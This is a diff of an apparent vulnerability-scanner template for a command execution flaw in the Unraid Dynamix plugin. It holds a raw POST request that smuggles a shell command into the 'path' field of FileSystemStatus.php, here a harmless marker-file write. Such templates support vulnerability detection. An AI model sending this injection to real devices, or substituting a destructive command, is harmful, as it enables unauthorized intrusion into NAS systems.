@@ -3,17 +3,11 @@ info:
   name: NAS设备 unraid Dynamix 插件 任意命令执行漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/tgy3q8cwhx56c0bt'
+  description: ''
   tags: rce,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: tgy3q8cwhx56c0bt
-    fofa: '"/webGui/images/banner.png"'
 http:
 - raw:
   - 'POST /plugins/dynamix/include/FileSystemStatus.php HTTP/1.1
-
-
 
 
     csrf_token=9855BE5478D13A31&cmd=scrub&path=echo dudesite >dudesite.txt
